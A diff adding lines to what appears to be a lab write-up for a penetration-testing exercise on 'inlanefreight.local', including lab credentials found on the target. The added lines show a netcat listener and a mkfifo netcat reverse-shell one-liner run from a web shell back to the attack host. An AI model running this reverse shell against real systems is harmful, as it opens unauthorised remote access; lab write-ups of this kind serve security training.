@@ -480,3 +480,16 @@ The credentials found in the user's home directory are:
 *mlefay:Plain Human work!*
 
 * **Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**
+
+
+I tried different ways to enumerate the internal network but it wasn't posibble to do with the web shell, I created a reverse shell
+
+started a nc connection on the attack host
+
+nc -lvnp 9090
+
+
+and a netcat reverse shell on the web shell
+
+www-data@inlanefreight.local:/home/webadmin# rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.93 9090 > /tmp/f
+
